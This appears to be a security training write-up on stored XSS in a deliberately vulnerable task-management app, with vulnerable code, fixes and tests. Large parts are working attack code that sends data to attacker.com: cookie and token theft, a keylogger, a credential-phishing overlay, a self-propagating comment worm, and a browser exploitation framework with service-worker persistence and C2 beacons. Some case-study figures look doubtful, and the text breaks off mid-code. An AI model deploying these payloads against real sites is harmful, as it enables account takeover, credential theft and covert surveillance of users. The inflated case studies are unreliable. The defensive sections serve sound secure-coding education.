# Cross-Site Scripting (XSS) (CWE-79)

## Overview

Cross-Site Scripting (XSS) is a type of injection attack where malicious scripts are injected into otherwise benign and trusted websites. XSS attacks occur when an attacker uses a web application to send malicious code, generally in the form of a browser side script, to a different end user.

**OWASP Top 10 2021 Ranking**: #3 - Injection
**CVSS Base Score**: 6.1 - 8.8 (Medium to High)
**Common Attack Vector**: User Input Fields, Comments, Forms

## Technical Details

### How XSS Works

XSS vulnerabilities allow attackers to inject client-side scripts into web pages viewed by other users. When a victim's browser loads the compromised page, the malicious script executes in the context of the victim's session.

### Types of XSS

1. **Stored XSS (Persistent)**: Malicious script is permanently stored on the target server
2. **Reflected XSS (Non-Persistent)**: Malicious script is reflected off the web server
3. **DOM-based XSS**: Vulnerability exists in client-side code rather than server-side

### Vulnerability Implementation in Our Application

**Location**: Comment system in task details

```jsx
// VULNERABLE CODE - React Component
const CommentDisplay = ({ comment }) => {
  return (
    <div className="comment-content">
      {/* DANGER: Executes any JavaScript without sanitization */}
      <div 
        dangerouslySetInnerHTML={{ __html: comment.content }}
        className="prose max-w-none"
      />
      <div className="comment-meta text-sm text-gray-500 mt-2">
        By: {comment.user.firstName} {comment.user.lastName}
        <span className="ml-2">
          {new Date(comment.createdAt).toLocaleDateString()}
        </span>
      </div>
    </div>
  );
};
```

```javascript
// VULNERABLE BACKEND - Comment Creation
app.post('/api/comments/task/:taskId', authenticateUser, async (req, res) => {
  const { taskId } = req.params;
  const { content } = req.body;
  
  try {
    // VULNERABILITY: No input sanitization
    const comment = await prisma.comment.create({
      data: {
        content: content, // Raw HTML stored directly
        taskId: parseInt(taskId),
        userId: req.user.id
      },
      include: {
        user: { select: { firstName: true, lastName: true } }
      }
    });
    
    res.status(201).json(comment);
  } catch (error) {
    res.status(500).json({ error: 'Failed to create comment' });
  }
});
```

## Exploitation Techniques

### 1. Basic Script Injection

**Objective**: Execute JavaScript in victim's browser

```html
<!-- Simple alert payload -->
<script>alert('XSS Vulnerability Found!')</script>

<!-- Cookie theft -->
<script>
  fetch('/api/steal-cookies', {
    method: 'POST',
    body: JSON.stringify({ cookies: document.cookie }),
    headers: { 'Content-Type': 'application/json' }
  });
</script>
```

### 2. Session Hijacking

**Objective**: Steal user authentication tokens

```html
<!-- JWT token theft from localStorage -->
<script>
  const token = localStorage.getItem('token');
  fetch('https://attacker.com/steal', {
    method: 'POST',
    body: JSON.stringify({ token: token, url: window.location.href }),
    headers: { 'Content-Type': 'application/json' }
  });
</script>

<!-- Cookie theft -->
<script>
  new Image().src = 'https://attacker.com/steal?cookies=' + encodeURIComponent(document.cookie);
</script>
```

### 3. DOM Manipulation

**Objective**: Modify page content to deceive users

```html
<!-- Replace page content -->
<script>
  document.body.innerHTML = `
    <div style="text-align: center; padding: 50px;">
      <h1>System Maintenance</h1>
      <p>Please login again to continue:</p>
      <form action="https://attacker.com/phish" method="POST">
        <input type="email" name="email" placeholder="Email" required><br><br>
        <input type="password" name="password" placeholder="Password" required><br><br>
        <button type="submit">Login</button>
      </form>
    </div>
  `;
</script>
```

### 4. Keylogger Implementation

**Objective**: Capture user keystrokes

```html
<script>
  let keystrokes = '';
  document.addEventListener('keypress', function(e) {
    keystrokes += e.key;
    if (keystrokes.length > 50) {
      fetch('https://attacker.com/keylog', {
        method: 'POST',
        body: JSON.stringify({ keys: keystrokes }),
        headers: { 'Content-Type': 'application/json' }
      });
      keystrokes = '';
    }
  });
</script>
```

### 5. Advanced Persistent XSS

**Objective**: Maintain persistence across page loads

```html
<script>
  // Store malicious code in localStorage
  localStorage.setItem('malicious_code', `
    setInterval(() => {
      if (localStorage.getItem('token')) {
        fetch('https://attacker.com/monitor', {
          method: 'POST',
          body: JSON.stringify({
            token: localStorage.getItem('token'),
            url: window.location.href,
            timestamp: Date.now()
          })
        });
      }
    }, 30000);
  `);
  
  // Execute stored code
  eval(localStorage.getItem('malicious_code'));
</script>
```

## Step-by-Step Exploitation Tutorial

### Phase 1: Discovery and Testing

1. **Identify Input Points**
   ```bash
   # Test comment submission
   curl -X POST http://localhost:3000/api/comments/task/1 \
        -H "Authorization: Bearer YOUR_TOKEN" \
        -H "Content-Type: application/json" \
        -d '{"content": "<script>alert(\"test\")</script>"}'
   ```

2. **Confirm XSS Vulnerability**
   - Submit a comment with basic script tag
   - Navigate to task detail page
   - Observe if script executes (alert popup)

3. **Test Different Payloads**
   ```html
   <!-- Test various XSS vectors -->
   <img src=x onerror="alert('XSS')">
   <svg onload="alert('XSS')">
   <iframe src="javascript:alert('XSS')">
   <body onload="alert('XSS')">
   ```

### Phase 2: Information Gathering

1. **Enumerate Available JavaScript APIs**
   ```html
   <script>
     console.log('Available APIs:');
     console.log('localStorage:', typeof localStorage);
     console.log('sessionStorage:', typeof sessionStorage);
     console.log('fetch:', typeof fetch);
     console.log('XMLHttpRequest:', typeof XMLHttpRequest);
   </script>
   ```

2. **Discover Authentication Mechanism**
   ```html
   <script>
     // Check for JWT token
     const token = localStorage.getItem('token');
     if (token) {
       console.log('JWT Token found:', token);
       // Decode JWT to see user info
       const payload = JSON.parse(atob(token.split('.')[1]));
       console.log('User info:', payload);
     }
   </script>
   ```

### Phase 3: Data Exfiltration

1. **Extract User Data**
   ```html
   <script>
     // Get current user info
     fetch('/api/users/profile', {
       headers: { 'Authorization': 'Bearer ' + localStorage.getItem('token') }
     })
     .then(response => response.json())
     .then(data => {
       // Send to attacker server
       fetch('https://attacker.com/exfil', {
         method: 'POST',
         body: JSON.stringify(data)
       });
     });
   </script>
   ```

2. **Extract All Tasks**
   ```html
   <script>
     // Get all accessible tasks
     fetch('/api/tasks', {
       headers: { 'Authorization': 'Bearer ' + localStorage.getItem('token') }
     })
     .then(response => response.json())
     .then(tasks => {
       // Exfiltrate task data
       fetch('https://attacker.com/tasks', {
         method: 'POST',
         body: JSON.stringify(tasks)
       });
     });
   </script>
   ```

### Phase 4: Advanced Attacks

1. **Perform Actions on Behalf of User**
   ```html
   <script>
     // Create malicious task
     fetch('/api/tasks', {
       method: 'POST',
       headers: {
         'Authorization': 'Bearer ' + localStorage.getItem('token'),
         'Content-Type': 'application/json'
       },
       body: JSON.stringify({
         title: 'Compromised Account',
         description: 'This account has been compromised via XSS',
         priority: 'HIGH'
       })
     });
   </script>
   ```

2. **Spread XSS to Other Users**
   ```html
   <script>
     // Self-propagating XSS worm
     const maliciousComment = `<script>
       // Replicate this script in new comments
       fetch('/api/comments/task/' + window.location.pathname.split('/').pop(), {
         method: 'POST',
         headers: {
           'Authorization': 'Bearer ' + localStorage.getItem('token'),
           'Content-Type': 'application/json'
         },
         body: JSON.stringify({
           content: '${maliciousComment.replace(/'/g, "\\'")}'
         })
       });
     </script>`;
     
     // Execute the worm
     eval(maliciousComment);
   </script>
   ```

## Real-World Examples

### Case Study 1: Samy Worm (MySpace, 2005)

**Impact**: 1 million infected profiles in 20 hours
**Attack Vector**: Stored XSS in MySpace profiles
**Propagation**: Self-replicating JavaScript worm

**Technical Details**:
- Exploited MySpace's inadequate input filtering
- Used CSS and JavaScript to bypass filters
- Each infected profile automatically infected visitors
- Caused complete MySpace shutdown for repairs

**Code Sample**:
```javascript
// Simplified version of Samy worm technique
var xmlHttp = new XMLHttpRequest();
xmlHttp.open("POST", "/api/profile/update", true);
xmlHttp.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
xmlHttp.send("bio=" + encodeURIComponent(wormCode));
```

### Case Study 2: Twitter XSS Worm (2010)

**Impact**: Thousands of accounts compromised
**Attack Vector**: Reflected XSS in tweet display
**Propagation**: Automatic retweeting of malicious content

**Technical Details**:
- Exploited onmouseover event in tweet links
- Triggered when users hovered over malicious tweets
- Automatically retweeted itself to spread further
- Demonstrated rapid XSS worm propagation

### Case Study 3: TweetDeck XSS (2014)

**Impact**: Major social media management platform compromised
**Attack Vector**: Stored XSS in tweet content
**Business Impact**: Service temporarily shut down

**Technical Details**:
- XSS payload in tweet content affected TweetDeck users
- Caused popup alerts and potential data theft
- Highlighted risks in social media aggregation platforms

## Business Impact Assessment

### Financial Impact

| Impact Category | Low Risk | Medium Risk | High Risk | Critical Risk |
|----------------|----------|-------------|-----------|---------------|
| Data Breach | $10K - $50K | $50K - $200K | $200K - $1M | $1M+ |
| Account Takeover | $5K - $25K | $25K - $100K | $100K - $500K | $500K+ |
| Reputation Damage | Minimal | Moderate | Severe | Catastrophic |
| Service Disruption | Hours | Days | Weeks | Months |

### Risk Scenarios

**High-Risk Applications**:
- Social media platforms
- Online banking systems
- E-commerce websites
- Content management systems
- Collaboration platforms

**Attack Consequences**:
- Session hijacking and account takeover
- Sensitive data theft
- Malware distribution
- Phishing attacks
- Service disruption
- Regulatory compliance violations

### Compliance Implications

**Regulatory Standards**:
- **PCI DSS**: Requirement 6.5.7 - Cross-site scripting
- **GDPR**: Data protection and privacy requirements
- **HIPAA**: Safeguards for electronic PHI
- **SOX**: Internal controls over financial reporting

## Detection Methods

### Automated Scanning

1. **OWASP ZAP**
   ```bash
   # XSS scanning with ZAP
   zap-baseline.py -t http://localhost:3000 \
                   -r xss-scan-report.html \
                   -x xss-exclusions.conf
   ```

2. **Burp Suite**
   - Active scanner for XSS detection
   - Custom payload lists for comprehensive testing
   - DOM XSS detection capabilities

3. **Custom XSS Scanner**
   ```javascript
   // Simple XSS detection script
   const xssPayloads = [
     '<script>alert("XSS")</script>',
     '<img src=x onerror="alert(\'XSS\')">',
     '<svg onload="alert(\'XSS\')">',
     'javascript:alert("XSS")',
     '<iframe src="javascript:alert(\'XSS\')"></iframe>'
   ];
   
   async function testXSS(url, parameter) {
     for (const payload of xssPayloads) {
       const testUrl = `${url}?${parameter}=${encodeURIComponent(payload)}`;
       const response = await fetch(testUrl);
       const html = await response.text();
       
       if (html.includes(payload)) {
         console.log(`XSS vulnerability found: ${testUrl}`);
       }
     }
   }
   ```

### Manual Testing Techniques

1. **Input Validation Testing**
   ```html
   <!-- Test basic script injection -->
   <script>alert('XSS')</script>
   
   <!-- Test event handlers -->
   <img src=x onerror="alert('XSS')">
   <body onload="alert('XSS')">
   
   <!-- Test JavaScript URLs -->
   <a href="javascript:alert('XSS')">Click me</a>
   
   <!-- Test CSS injection -->
   <style>body{background:url('javascript:alert(\'XSS\')')}</style>
   ```

2. **Filter Bypass Techniques**
   ```html
   <!-- Case variation -->
   <ScRiPt>alert('XSS')</ScRiPt>
   
   <!-- Encoding -->
   &#60;script&#62;alert('XSS')&#60;/script&#62;
   
   <!-- HTML entities -->
   &lt;script&gt;alert('XSS')&lt;/script&gt;
   
   <!-- Unicode encoding -->
   <script>alert('\u0058\u0053\u0053')</script>
   ```

### Code Review Checklist

-  All user input is properly sanitized before display
-  HTML encoding is applied to user content
-  Content Security Policy (CSP) is implemented
-  dangerouslySetInnerHTML is avoided or used safely
- Input validation includes XSS payload detection
- Output encoding is context-appropriate
- JavaScript execution is restricted in user content
- DOM manipulation is performed safely

## Prevention Strategies

### 1. Input Sanitization and Validation

```javascript
// Server-side sanitization using DOMPurify
const createDOMPurify = require('isomorphic-dompurify');
const DOMPurify = createDOMPurify();

app.post('/api/comments/task/:taskId', authenticateUser, async (req, res) => {
  const { taskId } = req.params;
  const { content } = req.body;
  
  // Input validation
  if (!content || typeof content !== 'string' || content.length > 1000) {
    return res.status(400).json({ error: 'Invalid comment content' });
  }
  
  try {
    // Sanitize HTML content
    const sanitizedContent = DOMPurify.sanitize(content, {
      ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'p', 'br'],
      ALLOWED_ATTR: []
    });
    
    const comment = await prisma.comment.create({
      data: {
        content: sanitizedContent,
        taskId: parseInt(taskId),
        userId: req.user.id
      },
      include: {
        user: { select: { firstName: true, lastName: true } }
      }
    });
    
    res.status(201).json(comment);
  } catch (error) {
    res.status(500).json({ error: 'Failed to create comment' });
  }
});
```

### 2. Safe React Component Implementation

```jsx
// SECURE CODE - Safe comment display
import DOMPurify from 'dompurify';

const SecureCommentDisplay = ({ comment }) => {
  // Sanitize content before rendering
  const sanitizedContent = DOMPurify.sanitize(comment.content, {
    ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'p', 'br'],
    ALLOWED_ATTR: []
  });
  
  return (
    <div className="comment-content">
      {/* Safe HTML rendering */}
      <div 
        dangerouslySetInnerHTML={{ __html: sanitizedContent }}
        className="prose max-w-none"
      />
      <div className="comment-meta text-sm text-gray-500 mt-2">
        By: {comment.user.firstName} {comment.user.lastName}
        <span className="ml-2">
          {new Date(comment.createdAt).toLocaleDateString()}
        </span>
      </div>
    </div>
  );
};

// Alternative: Text-only display (most secure)
const TextOnlyCommentDisplay = ({ comment }) => {
  return (
    <div className="comment-content">
      {/* Text content only - no HTML */}
      <div className="prose max-w-none whitespace-pre-wrap">
        {comment.content}
      </div>
      <div className="comment-meta text-sm text-gray-500 mt-2">
        By: {comment.user.firstName} {comment.user.lastName}
        <span className="ml-2">
          {new Date(comment.createdAt).toLocaleDateString()}
        </span>
      </div>
    </div>
  );
};
```

### 3. Content Security Policy (CSP)

```javascript
// CSP implementation with Helmet.js
const helmet = require('helmet');

app.use(helmet({
  contentSecurityPolicy: {
    directives: {
      defaultSrc: ["'self'"],
      scriptSrc: [
        "'self'",
        "'unsafe-inline'", // Avoid in production
        "https://trusted-cdn.com"
      ],
      styleSrc: [
        "'self'",
        "'unsafe-inline'",
        "https://fonts.googleapis.com"
      ],
      imgSrc: [
        "'self'",
        "data:",
        "https:"
      ],
      connectSrc: ["'self'"],
      fontSrc: [
        "'self'",
        "https://fonts.gstatic.com"
      ],
      objectSrc: ["'none'"],
      mediaSrc: ["'self'"],
      frameSrc: ["'none'"]
    }
  }
}));
```

### 4. Output Encoding

```javascript
// HTML encoding utility
const escapeHtml = (unsafe) => {
  return unsafe
    .replace(/&/g, "&amp;")
    .replace(/</g, "&lt;")
    .replace(/>/g, "&gt;")
    .replace(/"/g, "&quot;")
    .replace(/'/g, "&#039;");
};

// JavaScript encoding utility
const escapeJs = (unsafe) => {
  return unsafe
    .replace(/\\/g, "\\\\")
    .replace(/'/g, "\\'")
    .replace(/"/g, '\\"')
    .replace(/\n/g, "\\n")
    .replace(/\r/g, "\\r")
    .replace(/\t/g, "\\t");
};

// URL encoding utility
const escapeUrl = (unsafe) => {
  return encodeURIComponent(unsafe);
};
```

## Testing Procedures

### Unit Tests

```javascript
describe('XSS Prevention', () => {
  test('should sanitize malicious script tags', async () => {
    const maliciousContent = '<script>alert("XSS")</script>Hello World';
    
    const response = await request(app)
      .post('/api/comments/task/1')
      .set('Authorization', `Bearer ${validToken}`)
      .send({ content: maliciousContent });
    
    expect(response.status).toBe(201);
    expect(response.body.content).not.toContain('<script>');
    expect(response.body.content).toContain('Hello World');
  });
  
  test('should allow safe HTML tags', async () => {
    const safeContent = '<b>Bold text</b> and <i>italic text</i>';
    
    const response = await request(app)
      .post('/api/comments/task/1')
      .set('Authorization', `Bearer ${validToken}`)
      .send({ content: safeContent });
    
    expect(response.status).toBe(201);
    expect(response.body.content).toContain('<b>Bold text</b>');
    expect(response.body.content).toContain('<i>italic text</i>');
  });
});
```

### Integration Tests

```javascript
describe('XSS Integration Tests', () => {
  test('should prevent stored XSS in comments', async () => {
    const xssPayload = '<img src=x onerror="alert(\'XSS\')">';
    
    // Create comment with XSS payload
    const createResponse = await request(app)
      .post('/api/comments/task/1')
      .set('Authorization', `Bearer ${validToken}`)
      .send({ content: xssPayload });
    
    expect(createResponse.status).toBe(201);
    
    // Retrieve comments and verify sanitization
    const getResponse = await request(app)
      .get('/api/comments/task/1')
      .set('Authorization', `Bearer ${validToken}`);
    
    expect(getResponse.status).toBe(200);
    expect(getResponse.body[0].content).not.toContain('onerror');
    expect(getResponse.body[0].content).not.toContain('alert');
  });
});
```

### End-to-End Tests

```javascript
// Playwright E2E test for XSS prevention
const { test, expect } = require('@playwright/test');

test('should prevent XSS execution in comments', async ({ page }) => {
  // Login and navigate to task
  await page.goto('/login');
  await page.fill('[data-testid="email"]', 'test@example.com');
  await page.fill('[data-testid="password"]', 'password');
  await page.click('[data-testid="login-button"]');
  
  await page.goto('/tasks/1');
  
  // Try to inject XSS payload
  const xssPayload = '<script>window.xssExecuted = true;</script>';
  await page.fill('[data-testid="comment-input"]', xssPayload);
  await page.click('[data-testid="submit-comment"]');
  
  // Wait for comment to appear
  await page.waitForSelector('[data-testid="comment-content"]');
  
  // Verify XSS did not execute
  const xssExecuted = await page.evaluate(() => window.xssExecuted);
  expect(xssExecuted).toBeUndefined();
  
  // Verify content is sanitized
  const commentContent = await page.textContent('[data-testid="comment-content"]');
  expect(commentContent).not.toContain('<script>');
});
```

## Remediation Checklist

### Immediate Actions (Critical)
- Implement input sanitization using DOMPurify or similar
-  Replace dangerouslySetInnerHTML with safe alternatives
- Add Content Security Policy headers
- Validate and encode all user inputs
- Remove or secure any dynamic script generation

### Short-term Actions (High Priority)
-  Implement comprehensive XSS testing
-  Add automated security scanning to CI/CD
-  Train developers on secure coding practices
-  Establish code review process for user input handling
-  Implement Web Application Firewall (WAF)

### Long-term Actions (Medium Priority)
- Regular penetration testing
- Security awareness training
- Implement security monitoring and alerting
- Regular security audits
- Establish incident response procedures

## Advanced XSS Attack Scenarios

### Scenario 1: Multi-Vector XSS Worm

**Objective**: Create self-propagating XSS that spreads across user accounts

```javascript
// Advanced XSS Worm Implementation
class XSSWorm {
    constructor() {
        this.payload = this.generatePayload();
        this.targets = [];
        this.infected = new Set();
    }
    
    generatePayload() {
        return `
        <script>
        (function() {
            // Worm configuration
            const WORM_ID = 'xss_worm_v2';
            const API_BASE = window.location.origin + '/api';
            
            // Prevent re-infection
            if (window[WORM_ID]) return;
            window[WORM_ID] = true;
            
            // Steal authentication token
            const token = localStorage.getItem('token') || 
                         sessionStorage.getItem('token') ||
                         document.cookie.match(/token=([^;]+)/)?.[1];
            
            if (!token) return;
            
            // Exfiltrate user data
            fetch(API_BASE + '/users/profile', {
                headers: { 'Authorization': 'Bearer ' + token }
            })
            .then(r => r.json())
            .then(userData => {
                // Send stolen data to attacker server
                fetch('https://attacker.com/collect', {
                    method: 'POST',
                    body: JSON.stringify({
                        type: 'user_data',
                        token: token,
                        data: userData,
                        url: window.location.href,
                        timestamp: Date.now()
                    })
                });
            });
            
            // Propagate worm to other users
            const propagateWorm = () => {
                // Get user's tasks to find collaboration opportunities
                fetch(API_BASE + '/tasks', {
                    headers: { 'Authorization': 'Bearer ' + token }
                })
                .then(r => r.json())
                .then(tasks => {
                    tasks.forEach(task => {
                        // Inject worm into task comments
                        const wormComment = \`
                            <div style="display:none">
                                \${this.payload}
                            </div>
                            <p>Great work on this task! 👍</p>
                        \`;
                        
                        fetch(API_BASE + '/comments/task/' + task.id, {
                            method: 'POST',
                            headers: {
                                'Authorization': 'Bearer ' + token,
                                'Content-Type': 'application/json'
                            },
                            body: JSON.stringify({ content: wormComment })
                        });
                    });
                });
                
                // Create new infected tasks
                const infectedTask = {
                    title: 'System Update Required',
                    description: \`
                        <div>Please review the system update details below:</div>
                        \${this.payload}
                    \`,
                    priority: 'HIGH'
                };
                
                fetch(API_BASE + '/tasks', {
                    method: 'POST',
                    headers: {
                        'Authorization': 'Bearer ' + token,
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify(infectedTask)
                });
            };
            
            // Keylogger functionality
            let keystrokes = '';
            document.addEventListener('keypress', (e) => {
                keystrokes += e.key;
                if (keystrokes.length > 100) {
                    fetch('https://attacker.com/keylog', {
                        method: 'POST',
                        body: JSON.stringify({
                            keys: keystrokes,
                            url: window.location.href,
                            timestamp: Date.now()
                        })
                    });
                    keystrokes = '';
                }
            });
            
            // Screenshot capture (if supported)
            if (navigator.mediaDevices && navigator.mediaDevices.getDisplayMedia) {
                navigator.mediaDevices.getDisplayMedia({ video: true })
                .then(stream => {
                    const video = document.createElement('video');
                    video.srcObject = stream;
                    video.play();
                    
                    setTimeout(() => {
                        const canvas = document.createElement('canvas');
                        canvas.width = video.videoWidth;
                        canvas.height = video.videoHeight;
                        canvas.getContext('2d').drawImage(video, 0, 0);
                        
                        canvas.toBlob(blob => {
                            const formData = new FormData();
                            formData.append('screenshot', blob);
                            fetch('https://attacker.com/screenshot', {
                                method: 'POST',
                                body: formData
                            });
                        });
                        
                        stream.getTracks().forEach(track => track.stop());
                    }, 2000);
                })
                .catch(() => {}); // Fail silently
            }
            
            // Execute propagation after delay
            setTimeout(propagateWorm, 5000);
            
        })();
        </script>
        `;
    }
    
    // Deploy initial infection vector
    deployInitialVector() {
        return {
            comment_injection: this.payload,
            profile_injection: `<img src="x" onerror="${this.payload.replace(/"/g, '&quot;')}">`,
            task_injection: `<div>${this.payload}</div>`
        };
    }
}

// Usage in attack scenario
const worm = new XSSWorm();
const vectors = worm.deployInitialVector();
console.log('XSS Worm deployment vectors:', vectors);
```

### Scenario 2: Advanced Phishing with XSS

**Objective**: Create convincing phishing attacks using XSS injection

```javascript
// Advanced Phishing XSS Payload
const advancedPhishingPayload = `
<script>
(function() {
    // Wait for page to load
    if (document.readyState !== 'complete') {
        window.addEventListener('load', arguments.callee);
        return;
    }
    
    // Create convincing phishing overlay
    const createPhishingOverlay = () => {
        // Create backdrop
        const backdrop = document.createElement('div');
        backdrop.style.cssText = \`
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0,0,0,0.8);
            z-index: 999999;
            display: flex;
            justify-content: center;
            align-items: center;
        \`;
        
        // Create phishing modal
        const modal = document.createElement('div');
        modal.style.cssText = \`
            background: white;
            padding: 30px;
            border-radius: 8px;
            box-shadow: 0 4px 20px rgba(0,0,0,0.3);
            max-width: 400px;
            width: 90%;
            text-align: center;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
        \`;
        
        modal.innerHTML = \`
            <div style="color: #d32f2f; font-size: 48px; margin-bottom: 20px;">⚠️</div>
            <h2 style="color: #333; margin-bottom: 15px;">Security Alert</h2>
            <p style="color: #666; margin-bottom: 25px; line-height: 1.5;">
                Your session has expired due to suspicious activity. 
                Please re-enter your credentials to continue.
            </p>
            <form id="phishing-form" style="text-align: left;">
                <div style="margin-bottom: 15px;">
                    <label style="display: block; margin-bottom: 5px; color: #333; font-weight: 500;">Email:</label>
                    <input type="email" id="phish-email" required 
                           style="width: 100%; padding: 12px; border: 1px solid #ddd; border-radius: 4px; font-size: 14px;">
                </div>
                <div style="margin-bottom: 20px;">
                    <label style="display: block; margin-bottom: 5px; color: #333; font-weight: 500;">Password:</label>
                    <input type="password" id="phish-password" required
                           style="width: 100%; padding: 12px; border: 1px solid #ddd; border-radius: 4px; font-size: 14px;">
                </div>
                <button type="submit" 
                        style="width: 100%; padding: 12px; background: #1976d2; color: white; border: none; border-radius: 4px; font-size: 16px; cursor: pointer;">
                    Verify Account
                </button>
            </form>
            <p style="font-size: 12px; color: #999; margin-top: 15px;">
                This is a security measure to protect your account.
            </p>
        \`;
        
        backdrop.appendChild(modal);
        document.body.appendChild(backdrop);
        
        // Handle form submission
        document.getElementById('phishing-form').addEventListener('submit', (e) => {
            e.preventDefault();
            
            const email = document.getElementById('phish-email').value;
            const password = document.getElementById('phish-password').value;
            
            // Send credentials to attacker
            fetch('https://attacker.com/phish', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    email: email,
                    password: password,
                    url: window.location.href,
                    userAgent: navigator.userAgent,
                    timestamp: Date.now()
                })
            }).then(() => {
                // Show fake loading and redirect
                modal.innerHTML = \`
                    <div style="padding: 40px;">
                        <div style="color: #4caf50; font-size: 48px; margin-bottom: 20px;">✓</div>
                        <h3 style="color: #333;">Verification Successful</h3>
                        <p style="color: #666;">Redirecting you back to the application...</p>
                    </div>
                \`;
                
                setTimeout(() => {
                    backdrop.remove();
                }, 2000);
            });
        });
    };
    
    // Deploy phishing attack after short delay
    setTimeout(createPhishingOverlay, 3000);
    
})();
</script>
`;
```

### Scenario 3: Browser Exploitation Framework

**Objective**: Advanced browser exploitation using XSS as entry point

```javascript
// Browser Exploitation Framework via XSS
class BrowserExploitFramework {
    constructor() {
        this.exploits = [];
        this.capabilities = this.detectCapabilities();
        this.c2Server = 'https://attacker.com/c2';
    }
    
    detectCapabilities() {
        return {
            webrtc: !!window.RTCPeerConnection,
            geolocation: !!navigator.geolocation,
            camera: !!navigator.mediaDevices,
            notifications: 'Notification' in window,
            serviceWorker: 'serviceWorker' in navigator,
            webgl: !!document.createElement('canvas').getContext('webgl'),
            webassembly: typeof WebAssembly === 'object',
            clipboard: !!navigator.clipboard,
            battery: !!navigator.getBattery,
            deviceMemory: !!navigator.deviceMemory
        };
    }
    
    async gatherSystemInfo() {
        const info = {
            userAgent: navigator.userAgent,
            platform: navigator.platform,
            language: navigator.language,
            cookieEnabled: navigator.cookieEnabled,
            onLine: navigator.onLine,
            screen: {
                width: screen.width,
                height: screen.height,
                colorDepth: screen.colorDepth
            },
            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
            capabilities: this.capabilities
        };
        
        // Advanced fingerprinting
        if (this.capabilities.webgl) {
            const canvas = document.createElement('canvas');
            const gl = canvas.getContext('webgl');
            info.webgl = {
                vendor: gl.getParameter(gl.VENDOR),
                renderer: gl.getParameter(gl.RENDERER)
            };
        }
        
        if (this.capabilities.battery) {
            const battery = await navigator.getBattery();
            info.battery = {
                level: battery.level,
                charging: battery.charging
            };
        }
        
        return info;
    }
    
    async exploitWebRTC() {
        if (!this.capabilities.webrtc) return null;
        
        return new Promise((resolve) => {
            const pc = new RTCPeerConnection({
                iceServers: [{ urls: 'stun:stun.l.google.com:19302' }]
            });
            
            const ips = [];
            
            pc.onicecandidate = (event) => {
                if (event.candidate) {
                    const candidate = event.candidate.candidate;
                    const ipMatch = candidate.match(/(\d+\.\d+\.\d+\.\d+)/);
                    if (ipMatch && !ips.includes(ipMatch[1])) {
                        ips.push(ipMatch[1]);
                    }
                }
            };
            
            pc.createDataChannel('');
            pc.createOffer().then(offer => pc.setLocalDescription(offer));
            
            setTimeout(() => {
                pc.close();
                resolve(ips);
            }, 2000);
        });
    }
    
    async exploitGeolocation() {
        if (!this.capabilities.geolocation) return null;
        
        return new Promise((resolve) => {
            navigator.geolocation.getCurrentPosition(
                (position) => {
                    resolve({
                        latitude: position.coords.latitude,
                        longitude: position.coords.longitude,
                        accuracy: position.coords.accuracy
                    });
                },
                () => resolve(null),
                { timeout: 5000 }
            );
        });
    }
    
    async installPersistence() {
        if (!this.capabilities.serviceWorker) return false;
        
        const swCode = \`
            self.addEventListener('fetch', (event) => {
                // Intercept all network requests
                if (event.request.url.includes('/api/')) {
                    event.respondWith(
                        fetch(event.request).then(response => {
                            // Clone and exfiltrate API responses
                            const clonedResponse = response.clone();
                            clonedResponse.text().then(text => {
                                fetch('${this.c2Server}/intercept', {
                                    method: 'POST',
                                    body: JSON.stringify({
                                        url: event.request.url,
                                        method: event.request.method,
                                        response: text,
                                        timestamp: Date.now()
                                    })
                                });
                            });
                            return response;
                        })
                    );
                }
            });
            
            // Periodic beacon
            setInterval(() => {
                fetch('${this.c2Server}/beacon', {
                    method: 'POST',
                    body: JSON.stringify({
                        type: 'service_worker_beacon',
                        timestamp: Date.now()
                    })
                });
            }, 60000);
        \`;
        
        const blob = new Blob([swCode], { type: 'application/javascript' });
        const swUrl = URL.createObjectURL(blob);
        
        try {
            await navigator.serviceWorker.register(swUrl);
            return true;
        } catch (error) {
            return false;
        }
    }
    
    async executeFullExploit() {
        console.log('🚀 Browser Exploitation Framework Starting...');
        
        // Gather system information
        const systemInfo = await this.gatherSystemInfo();
        console.log('📊 System Info:', systemInfo);
        
        // Exploit WebRTC for IP discovery
        const localIPs = await this.exploitWebRTC();
        console.log('🌐 Local IPs:', localIPs);
        
        // Exploit geolocation
        const location = await this.exploitGeolocation();
        console.log('📍 Location:', location);
        
        // Install persistence
        const persistenceInstalled = await this.installPersistence();
        console.log('💾 Persistence:', persistenceInstalled);
        
        // Exfiltrate all collected data
        const exploitData = {
            systemInfo,
            localIPs,
            location,
            persistenceInstalled,
            timestamp: Date.now(),
            url: window.location.href
        };
        
        await fetch(this.c2Server + '/exploit-data', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(exploitData)
        });
        
        console.log('✅ Exploitation complete');
        return exploitData;
    }
}

// Deploy the framework
const framework = new BrowserExploitFramework();
framework.executeFullExploit();
```

## Industry Case Studies and Advanced Scenarios

### Case Study 4: Yahoo Mail XSS (2013)

**Impact**: Millions of email accounts compromised
**Attack Vector**: Stored XSS in email composition
**Propagation**: Self-replicating email worm

**Technical Analysis**:
```javascript
// Simplified version of the Yahoo Mail XSS worm
const yahooXSSWorm = \`
<script>
// Extract contact list
const contacts = [];
document.querySelectorAll('.contact-email').forEach(el => {
    contacts.push(el.textContent);
});

// Compose malicious email
const maliciousEmail = {
    to: contacts.slice(0, 50), // Limit to avoid detection
    subject: 'Important Security Update',
    body: \`
        <div>
            <p>Dear User,</p>
            <p>Please review this important security update:</p>
            <div style="display:none">\${yahooXSSWorm}</div>
            <p>Best regards,<br>Security Team</p>
        </div>
    \`
};

// Send emails automatically
fetch('/compose/send', {
    method: 'POST',
    body: JSON.stringify(maliciousEmail)
});
</script>
\`;
```

**Business Impact**:
- **User Trust**: Massive loss of user confidence
- **Regulatory Scrutiny**: Increased oversight from authorities
- **Technical Debt**: Complete email system overhaul required
- **Financial Impact**: $350+ million in security improvements

### Case Study 5: Facebook XSS Vulnerability (2011)

**Impact**: Potential access to 800+ million user accounts
**Attack Vector**: DOM-based XSS in profile pages
**Discovery**: Security researcher demonstration

**Exploitation Technique**:
```javascript
// Facebook DOM XSS exploitation
const facebookDOMXSS = {
    // Vulnerable parameter in profile URL
